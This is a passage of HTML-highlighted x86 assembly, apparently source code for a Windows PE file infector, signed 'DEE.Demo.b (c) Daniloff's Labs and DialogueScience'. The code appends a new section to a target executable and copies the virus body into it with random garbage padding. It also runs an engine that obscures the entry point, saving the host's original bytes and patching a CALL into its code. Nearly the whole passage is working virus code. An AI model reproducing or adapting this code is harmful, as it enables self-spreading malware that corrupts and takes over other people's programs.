        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_vSize</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; Physical</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_pSize</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_flags</span><span class="sc4">],</span><span class="sc2">0E0000020h</span><span class="sc0">   </span><span class="sc1">; flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.pe_RVA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ESI = code RVA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">eax.pe_Obj_RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.pe_codeRVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ESI = physical .code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">eax.pe_Obj_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; entrypoint</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">edx.mz_oeminfo</span><span class="sc4">],</span><span class="sc12">'balD'</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.pe_headersize</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">      </span><span class="sc1">; increse headers size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.pe_objcnt</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; +1 object</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.pe_Obj_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.pe_Obj_vSize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Modify image size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.pe_imagesize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_flags</span><span class="sc4">],</span><span class="sc2">0E0000020h</span><span class="sc0">    </span><span class="sc1">; .code flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.pe_objcnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0XPU'</span><span class="sc0">

</span><span class="sc5">rename_obj</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                               </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; Rename sections</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rename_obj</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                 
</span><span class="sc9">comment</span><span class="sc0"> </span><span class="sc4">~</span><span class="sc0">
</span><span class="sc5">@@__dflags</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__dasmtbl</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__dasm</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__seed</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__rnd</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__free</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__malloc</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">  </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__csize</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc5">@d</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@__code</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc5">@d</span><span class="sc4">]~</span><span class="sc0">

        </span><span class="sc1">;EDI=physical RVA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.pe_codeSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ldizx_init</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; EDI = tables</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DEE_LINKS</span><span class="sc0">              </span><span class="sc1">; flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; dtables</span><span class="sc0">
        </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">ldizx</span><span class="sc0">             </span><span class="sc1">; dasm</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; seed ptr</span><span class="sc0">
        </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                               </span><span class="sc1">; rnd</span><span class="sc0">
        </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">                              </span><span class="sc1">; free</span><span class="sc0">
        </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc0">                </span><span class="sc1">; malloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; csize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dee</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">9</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EAX = command RVA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">obj_delta</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = delta</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_cmd</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                               </span><span class="sc1">; Copy bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Write Call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; ESI = PE header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_BEGIN</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fseek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.pe_headersize</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;EDX = headers                          ; Write headers</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fwrite</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;       int 3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.pe_Obj_offset</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Seek to new object</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_BEGIN</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fseek</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.pe_Obj_pSize</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc0">                             </span><span class="sc1">; Allocate bufer for</span><span class="sc0">
</span><span class="sc1">;       add esp,4                               ; object</span><span class="sc0">


</span><span class="sc1">;       push 4 ptr[edi.pe_Obj_pSize]        </span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">obj_delta</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">obj_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                        </span><span class="sc1">; Write garbage</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">obj_garbage</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virstart</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc0">                         </span><span class="sc1">; Write body to bufer</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; EDX = bufer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ECX = object size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fwrite</span><span class="sc0">             </span><span class="sc1">; Write object</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_object</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.pe_Obj_offset</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Seek to code object</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_BEGIN</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fseek</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; EDX=code offsety</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.pe_Obj_pSize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; code size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fwrite</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fclose</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_exit_free_nc</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">i_exit_free</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fclose</span><span class="sc0">

</span><span class="sc5">i_exit_free_nc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">i_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">dee</span><span class="sc0">\</span><span class="sc5">dee.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ldizx</span><span class="sc0">\</span><span class="sc5">ldizx.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">import.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">search.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">fio.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">system.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rnd.inc</span><span class="sc0">

</span><span class="sc5">old_cmd</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">atom_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">ATOM</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virsize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">

</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">obj_delta</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_object</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">first_object</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">atom_id</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">seed</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DEE.Demo.b (c) Daniloff's Labs and DialogueScience"</span><span class="sc0">
